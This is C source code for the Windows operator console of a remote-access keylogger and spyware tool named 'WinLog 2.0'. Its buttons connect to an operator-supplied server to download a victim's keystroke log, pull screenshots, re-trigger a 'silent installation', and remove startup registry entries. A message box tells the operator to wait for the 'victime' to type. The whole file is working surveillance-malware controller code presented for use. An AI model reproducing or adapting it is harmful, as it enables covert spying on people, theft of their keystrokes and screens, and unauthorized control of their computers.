#include <windows.h>
#include <stdio.h>
#include <errno.h>
#include <assert.h>
#include <time.h>   // time(), localtime(), struct tm
#include <ctype.h>    // tolower()

#include <winsock2.h>
#include <commctrl.h>

#include "../includes/constants.h"
#include "../includes/utils.h"

#define 	CAIRO_HAS_WIN32_SURFACE


// -lws2_32

HINSTANCE hInstance;
HHOOK hKbHook = NULL;

HWND hServerIP = NULL;
TCHAR IP_buffer[16] = "";

HWND hProgress_bar = NULL;

int APIENTRY WinMain(HINSTANCE cetteInstance, HINSTANCE precedenteInstance, LPSTR lignesDeCommande, int modeAffichage)
{
    HWND main_window;
    MSG msg;
    WNDCLASS win_class;

    hInstance = cetteInstance;

    win_class.style = 0;
    win_class.lpfnWndProc = mainWindowProc;
    win_class.cbClsExtra = 0;
    win_class.cbWndExtra = 0;
    win_class.hInstance = NULL;
    win_class.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    win_class.hCursor = LoadCursor(NULL, IDC_ARROW);
    win_class.hbrBackground = GetSysColorBrush(COLOR_3DFACE);
    win_class.lpszMenuName = NULL;
    win_class.lpszClassName = "classF";

    if(!RegisterClass(&win_class))
        return FALSE;

    main_window = CreateWindow("classF", "WinLog 2.0", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                                CW_USEDEFAULT, CW_USEDEFAULT, 560, 310, NULL, NULL, cetteInstance, NULL);
    if(!main_window)
        return FALSE;

    ShowWindow(main_window, modeAffichage);
    UpdateWindow(main_window);

    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKbHook);

    return (int)msg.wParam;
}

LRESULT CALLBACK mainWindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HDC hdc;
    PAINTSTRUCT ps;
    HICON hIcon;

    size_t flag = 0;
    int regkey_deleted = 0;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    long weight = 0;
    long tailleBlockRecut = 0;
    long data_len = 0;
    long totalRcv = 0;
    int empty_log = 0;
    //int ret = 0;

    char buffer[MAXDATASIZE] = "";

    FILE *download_log_file = NULL;

    long step_foreward = 0.;

    static HBITMAP hBitmap;
    HDC hdcBitmap = NULL;
    BITMAP bitmap;
    HDC hdcMem;
    HGDIOBJ oldBitmap;

    switch(msg)
    {
        case WM_CREATE :

            hBitmap = (HBITMAP) LoadImageW(NULL, L"BG_2.bmp",
                        IMAGE_BITMAP, 560, 310, LR_LOADFROMFILE);


            if (hBitmap == NULL) {
             MessageBoxW(hwnd, L"Failed to load image", L"Error", MB_OK);
            }

            FillWindow(hwnd);

            return 0;

        // this part below removes flickering !
        case WM_ERASEBKGND:
             return (LRESULT)1;

        case WM_SIZE:
            InvalidateRect(hwnd,NULL,FALSE);
            break;

        case WM_PAINT:

            hdc = BeginPaint(hwnd, &ps);
            //RECT rect;
            HBRUSH brush = NULL;

            hdcMem = CreateCompatibleDC(hdc);
            oldBitmap = SelectObject(hdcMem, hBitmap);

            GetObject(hBitmap, sizeof(bitmap), &bitmap);
            BitBlt(hdc, 0, 0, bitmap.bmWidth, bitmap.bmHeight, hdcMem, 0, 0, SRCCOPY);

            SelectObject(hdcMem, oldBitmap);

            hIcon = (HICON)LoadIcon(hInstance, IDI_APPLICATION);
            DrawIconEx(hdc, 5, 5, hIcon, 20, 20, 0, brush, 0);

            DeleteDC(hdcBitmap);

            EndPaint(hwnd, &ps);

            return 0;

        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;

        case WM_COMMAND:

            switch(LOWORD(wParam))
            {
                case ID_CLOSE:
                    PostQuitMessage(EXIT_SUCCESS);
                    return 0;

                case ID_MINIMIZE:
                    SendMessage(hwnd, WM_SYSCOMMAND, SC_MINIMIZE, lParam);
                    return 0;

                case ID_B_IMPORTLOG :
                {
                    flag = 1;

                    WSADATA WSAData;
                    int erreur = WSAStartup(MAKEWORD(2,2), &WSAData);

                    if(!erreur)
                    {
                        sock = socket(AF_INET, SOCK_STREAM, 0);

                        sin.sin_addr.s_addr = inet_addr(IP_buffer);
                        sin.sin_family = AF_INET;
                        sin.sin_port = htons(PORT);

                        if(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR)
                        {
                            /** Send flag value **/
                            if(send(sock, (char*)&flag, sizeof(flag), 0) != SOCKET_ERROR)
                            {
                                /** Open log's file wish will be received **/
                                download_log_file = fopen("BaseBrd.log", "wb");
                                if(download_log_file == NULL)
                                {
                                    perror("fopen() download_log_file ");
                                    exit(-1);
                                }

                                if(recv(sock, (char*)&empty_log, sizeof(empty_log), 0) == SOCKET_ERROR)
                                {
                                    perror("recv() empty log value failed ");
                                }

                                if(empty_log == 1)
                                {
                                    MessageBox(hwnd, "Log file is empty.\nPlease wait victime type something.", "Log File Empty",
                                               MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_APPLMODAL);

                                    fclose(download_log_file);
                                    closesocket(sock);
                                    WSACleanup();

                                    return 0;
                                }

                                /** Receive file's weigth **/
                                if(recv(sock, (char*)&weight, sizeof(weight), 0) == SOCKET_ERROR)
                                {
                                    perror("recv() weight failed ");
                                }

                                do
                                {
                                    tailleBlockRecut = recv(sock, buffer, weight, 0);

                                    fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, download_log_file);

                                    totalRcv += tailleBlockRecut;

                                }while(totalRcv < weight);

                                printf("File downloaded ...\n");

                                fclose(download_log_file);
                                closesocket(sock);
                                WSACleanup();

                                MessageBox(hwnd, "Log file downloaded.", "Success", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 |
                                            MB_APPLMODAL);

                                //system("python decode_b64.py");
                                //system("del /F BaseBrd_encoded.log");

                            }
                        }

                        else
                        {
                            MessageBox(hwnd, "Server unreachable.Connection failed !", "Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 |
                                                    MB_APPLMODAL);

                            perror("Impossible de se connecter ");

                            return 0;
                        }
                    }
                    return 0;
                }

                case ID_B_SCREENSHOT :
                {
                    FILE *multi_screenshot_file = NULL;

                    flag = 2;

                    WSADATA WSAData;
                    int erreur = WSAStartup(MAKEWORD(2,2), &WSAData);

                    if(!erreur)
                    {
                        sock = socket(AF_INET, SOCK_STREAM, 0);

                        sin.sin_addr.s_addr = inet_addr(IP_buffer);
                        sin.sin_family = AF_INET;
                        sin.sin_port = htons(PORT);

                        if(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR)
                        {
                            if(send(sock, (char*)&flag, sizeof(flag), 0) != SOCKET_ERROR)
                            {
                                multi_screenshot_file = fopen("screenshot.jpg", "wb");
                                if(multi_screenshot_file == NULL)
                                {
                                    perror("fopen() screenshot file failed ");
                                    exit(-1);
                                }

                                if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
                                {
                                    perror("recv() data_len failed ");
                                    exit(-1);
                                }

                                SendMessage(hProgress_bar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
                                SendMessage(hProgress_bar, PBM_SETSTEP, 1, 0);

                                do
                                {
                                    tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);

                                    fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, multi_screenshot_file);

                                    totalRcv += tailleBlockRecut;

                                    step_foreward = (totalRcv * 100) / data_len;

                                    SendMessage(hProgress_bar, PBM_SETPOS, (WPARAM)step_foreward, 0);

                                }while(totalRcv < data_len);

                                printf("Reception du screenshot success !!!!\n");

                                fclose(multi_screenshot_file);

                                closesocket(sock);
                                WSACleanup();

                                MessageBox(hwnd, "Screenshot downloaded.", "Success", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 |
                                            MB_APPLMODAL);
                            }
                        }

                        else
                        {
                            MessageBox(hwnd, "Server unreachable.Connection failed !", "Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 |
                                                    MB_APPLMODAL);

                            perror("Impossible de se connecter ");

                            return 0;
                        }
                    }

                    return 0;
                }

                /*
                case ID_B_MULTI_SCREENSHOTS :
                {
                    FILE *multi_screenshot_file = NULL;
                    //long tailleBlockRecut = 0;
                    //long data_len = 0;
                    //long totalRcv = 0;

                    flag = 4;

                    WSADATA WSAData;
                    int erreur = WSAStartup(MAKEWORD(2,2), &WSAData);


                    ret = MessageBox(hwnd, "How many screeenshots you want to take ?", "Number of screeenshots.", MB_YESNO | MB_ICONQUESTION |
                                        MB_DEFBUTTON2 | MB_SYSTEMMODAL | MB_TOPMOST);

                    if(!erreur)
                    {
                        sock = socket(AF_INET, SOCK_STREAM, 0);

                        sin.sin_addr.s_addr = inet_addr(IP_buffer);
                        sin.sin_family = AF_INET;
                        sin.sin_port = htons(PORT);

                        if(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR)
                        {
                            if(send(sock, (char*)&flag, sizeof(flag), 0) != SOCKET_ERROR)
                            {
                                multi_screenshot_file = fopen("multi_screenshots.jpg", "wb");
                                if(multi_screenshot_file == NULL)
                                {
                                    perror("fopen() multi_screenshot file failed ");
                                    exit(-1);
                                }

                                if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
                                {
                                    perror("recv() data_len failed ");
                                    exit(-1);
                                }

                                SendMessage(hProgress_bar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
                                SendMessage(hProgress_bar, PBM_SETSTEP, 1, 0);

                                do
                                {
                                    tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);

                                    fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, multi_screenshot_file);

                                    totalRcv += tailleBlockRecut;

                                    step_foreward = (totalRcv * 100) / data_len;

                                    SendMessage(hProgress_bar, PBM_SETPOS, (WPARAM)step_foreward, 0);

                                    //printf("step_foreward = %ld\n", step_foreward);

                                    //printf("-----> %ld octets recieved ... \n", totalRcv);

                                }while(totalRcv < data_len);

                                printf("Reception of a screenshot success !!!!\n");

                                fclose(multi_screenshot_file);

                                closesocket(sock);
                                WSACleanup();

                                MessageBox(hwnd, "Multi Screenshots downloaded.", "Success", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 |
                                            MB_APPLMODAL);
                            }
                        }

                        else
                        {
                            MessageBox(hwnd, "Server unreachable.Connection failed !", "Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 |
                                                    MB_APPLMODAL);

                            perror("Impossible de se connecter ");

                            return 0;
                        }
                    }

                    return 0;
                }
                */

                case ID_B_INIT :
                {
                    flag = 3;

                    WSADATA WSAData;
                    int ret_error = WSAStartup(MAKEWORD(2,2), &WSAData);

                    if(!ret_error)
                    {
                        sock = socket(AF_INET, SOCK_STREAM, 0);

                        sin.sin_addr.s_addr = inet_addr(IP_buffer);
                        sin.sin_family = AF_INET;
                        sin.sin_port = htons(PORT);

                        if(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR)
                        {
                            printf("Connected ...\n\n");
                        }

                        else
                        {
                            MessageBox(hwnd, "Server unreachable. Connection failed !", "Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 |
                                                    MB_APPLMODAL);

                            perror("Impossible de se connecter ");
                            return 0;
                        }

                        if(send(sock, (char*)&flag, sizeof(char), 0) != SOCKET_ERROR)
                            printf("flag init  = %d\n", flag);

                        closesocket(sock);
                        WSACleanup();

                        MessageBox(hwnd, "Silent installation's process has been re initialized.", "Success", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 |
                                            MB_APPLMODAL);
                    }

                    return 0;
                }

                case ID_B_DELETE_STARTUP :
                {
                    flag = 5;

                    WSADATA WSAData;
                    int erreur = WSAStartup(MAKEWORD(2,2), &WSAData);

                    if(!erreur)
                    {
                        sock = socket(AF_INET, SOCK_STREAM, 0);

                        sin.sin_addr.s_addr = inet_addr(IP_buffer);
                        sin.sin_family = AF_INET;
                        sin.sin_port = htons(PORT);

                        if(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR)
                        {
                            if(send(sock, (char*)&flag, sizeof(flag), 0) != SOCKET_ERROR)
                            {
                                printf("\nFlag sended\n");
                            }

                            if(recv(sock, (char*)&regkey_deleted, sizeof(regkey_deleted), 0) != SOCKET_ERROR)
                                MessageBox(hwnd, "Reg Keys have been deleted.", "Success",
                                           MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_APPLMODAL);
                            else
                                perror("recv() regkey_deleted failed !");
                        }
                    }


                }

                case ID_B_SETIP :
                {
                    //TCHAR IP_buffer[16] = "";

                    GetWindowText(hServerIP, IP_buffer, 16);

                    printf("IP_buffer ---> %s\n", IP_buffer);

                    return 0;
                }
            }


        default :
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }

    return EXIT_SUCCESS;
}


VOID FillWindow(HWND main_window)
{
    static HWND button[6] = {NULL};

    HWND hSetServerIP = NULL;

    HWND reinit_silent_instalations = NULL;

    int i = 0;

    hProgress_bar = CreateWindowEx(0, PROGRESS_CLASS, NULL, WS_CHILD | WS_VISIBLE | PBS_SMOOTH, 2, 250, 540, 18, main_window, NULL, NULL, NULL);
    if(!hProgress_bar)
        return;

    button[0] = CreateWindow(TEXT("BUTTON"), TEXT("Take A Screenshot"), WS_CHILD | WS_VISIBLE, 20, 80, 164, 30, main_window, (HMENU)ID_B_SCREENSHOT, hInstance, NULL);
    button[1] = CreateWindow(TEXT("BUTTON"), TEXT("Take Multi Screenshots"), WS_CHILD | WS_VISIBLE, 20, 150, 164, 30, main_window, (HMENU)ID_B_MULTI_SCREENSHOTS, hInstance, NULL);
    button[2] = CreateWindow(TEXT("BUTTON"), TEXT("Import Keylogger Log"), WS_CHILD | WS_VISIBLE, 190, 80, 164, 30, main_window, (HMENU)ID_B_IMPORTLOG, hInstance, NULL);
    button[3] = CreateWindow(TEXT("BUTTON"), TEXT("Re Install Server"), WS_CHILD | WS_VISIBLE, 360, 150, 164, 30, main_window, (HMENU)ID_B_INIT, hInstance, NULL);
    button[4] = CreateWindow(TEXT("BUTTON"), TEXT("Delete on Startup"), WS_CHILD | WS_VISIBLE, 360, 80, 164, 30, main_window, (HMENU)ID_B_DELETE_STARTUP, hInstance, NULL);

    //button[5] = CreateWindow(TEXT("BUTTON"), TEXT("Add on Startup"), WS_CHILD | WS_VISIBLE, 190, 150, 164, 30, main_window, (HMENU)ID_B_ADD_STARTUP, hInstance, NULL);

    hServerIP = CreateWindow(TEXT("EDIT"), TEXT("Enter Server IP"), WS_CHILD | WS_VISIBLE | ES_WANTRETURN | SS_CENTER, 110, 20, 120, 20, main_window, (HMENU)ID_SERVER, hInstance, NULL);
    hSetServerIP = CreateWindow(TEXT("BUTTON"), TEXT("SET IP"), WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 340, 20, 100, 20, main_window, (HMENU)ID_B_SETIP, hInstance, NULL);


    //reinit_silent_instalations = CreateWindow(TEXT("BUTTON"), TEXT("Init Installations"), WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 50, 150, 200, 30, main_window, (HMENU)ID_B_INIT, hInstance, NULL);

    if(!hSetServerIP)
        return;

    if(!reinit_silent_instalations)
        return;

    for(i = 0; i < 4; i++)
    {
        if(!button[i])
            return;
    }

    return;
}
